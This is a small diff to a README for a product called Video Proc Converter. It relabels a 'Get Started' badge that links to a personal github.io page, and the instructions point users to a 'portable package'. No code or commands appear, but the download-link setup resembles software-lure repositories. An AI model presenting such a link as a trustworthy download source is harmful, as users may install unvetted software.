@@ -11,7 +11,7 @@ Video Proc Converter offers enterprise-level functionality while remaining intui
 
 ## Getting Started
 
-[![Start Processing](https://img.shields.io/badge/Start-Processing-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/video-proc-converter)
+[![Get Started](https://img.shields.io/badge/Get%20Video-Proc-ff6b6b?style=for-the-badge)](https://sharon3349949.github.io/.github/video-proc-converter)
 
 1. Launch Video Proc Converter directly from the portable package.  
 2. Configure your preferred encoding profile and output structure.  
